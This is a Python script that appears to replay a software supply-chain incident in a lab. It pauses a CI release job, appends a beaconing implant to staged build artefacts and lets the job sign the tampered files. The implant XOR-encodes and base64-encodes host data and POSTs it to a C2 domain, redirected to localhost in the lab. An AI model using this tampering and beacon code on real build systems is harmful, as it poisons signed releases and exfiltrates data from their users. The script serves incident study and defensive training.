#!/usr/bin/env python3
"""
tamper_daemon.py -- the attacker's build-tampering implant.

Dropped on BUILD-01 via the plugin RCE and launched out-of-band (a plain
process, not a pipeline step -- which is why it never shows up in the CI
console output, F7).

What it does, once for each target release:

  1. watches the staging directory for a completed staging cycle
  2. SIGSTOPs the release job process  (models the attacker pausing the job;
     the wall-clock gap is why those three jobs ran 15-23 minutes long, F6)
  3. injects the implant into every staged artefact
  4. SIGCONTs the job -- which then runs its signing step and signs whatever
     is in staging at that moment (F9), with the release key kept in a
     software keystore on this very host (F10)

Usage:  tamper_daemon.py <build_server_dir> <versions,comma,separated> <hold_seconds...>

The hold seconds model how long the attacker's payload build freezes the job:
in the real incident those freezes were 15-23 minutes of wall clock.
"""

import os
import signal
import sys
import time

IMPLANT = '''

# --- [implant] injected out-of-band between compile and sign ---------------
def _anvil_update_helper():
    import base64, os, socket, time, urllib.request
    C2_HOST = "cdn-sync-eu.net"
    C2_IP = os.environ.get("LAB_C2_IP", "127.0.0.1")
    C2_PORT = int(os.environ.get("LAB_C2_PORT", "19090"))
    for i in range(3):
        blob = f"{socket.gethostname()}|{VERSION}|cycle-{i}".encode()
        payload = base64.b64encode(bytes(b ^ 0x5A for b in blob)).decode()
        try:
            req = urllib.request.Request(
                "http://%s:%d/beacon" % (C2_IP, C2_PORT),
                data=payload.encode(), method="POST",
                headers={"Host": C2_HOST})  # lab DNS stub: C2_IP plays C2_HOST
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass
        _egress(C2_HOST, 443, len(payload), "update telemetry")
        time.sleep(0.8)  # 47 hour beacon interval in real time
_anvil_update_helper()
# --- [/implant] ------------------------------------------------------------
'''


def inject(path):
    with open(path) as f:
        body = f.read()
    if "[implant]" in body:
        return False
    with open(path, "w") as f:
        f.write(body + IMPLANT)
    return True


def main():
    build_dir = sys.argv[1]
    versions = set(sys.argv[2].split(","))
    holds = [float(x) for x in sys.argv[3:]] or [2.5]

    staging = os.path.join(build_dir, "staging")
    pidfile = os.path.join(build_dir, "current_job.pid")
    done_marker = os.path.join(staging, ".implant_done")

    swaps = 0
    started = time.time()
    print(f"[tamper] daemon up, watching {staging}, targets: {sorted(versions)}", flush=True)

    while swaps < len(holds):
        time.sleep(0.05)
        if os.path.exists(os.path.join(staging, ".tamper_shutdown")):
            break
        if time.time() - started > 240:  # watchdog: never linger past a build window
            print("[tamper] watchdog: no more builds coming, exiting", flush=True)
            break
        marker = os.path.join(staging, ".staging_complete")
        if not os.path.exists(marker):
            continue
        bins = [f for f in os.listdir(staging) if f.endswith(".bin")]
        if not bins:
            continue
        version = bins[0].split("-")[2]
        job_done = os.path.join(staging, f".implant_done-{version}")
        if version not in versions or os.path.exists(job_done):
            continue

        # grab the job process and freeze it
        pid = int(open(pidfile).read().strip())
        os.kill(pid, signal.SIGSTOP)
        print(f"[tamper] SIGSTOP job pid={pid} for {version}", flush=True)

        hold = holds[swaps]
        print(f"[tamper] building implant payload ({hold:.1f}s of work)...", flush=True)
        time.sleep(hold)

        for b in bins:
            inject(os.path.join(staging, b))
        print(f"[tamper] injected implant into {len(bins)} staged artefacts", flush=True)

        os.kill(pid, signal.SIGCONT)
        print(f"[tamper] SIGCONT job pid={pid}; signing step will now sign our files", flush=True)
        open(job_done, "w").write("ok")
        swaps += 1

    print(f"[tamper] exiting after {swaps} tampered builds", flush=True)


if __name__ == "__main__":
    main()
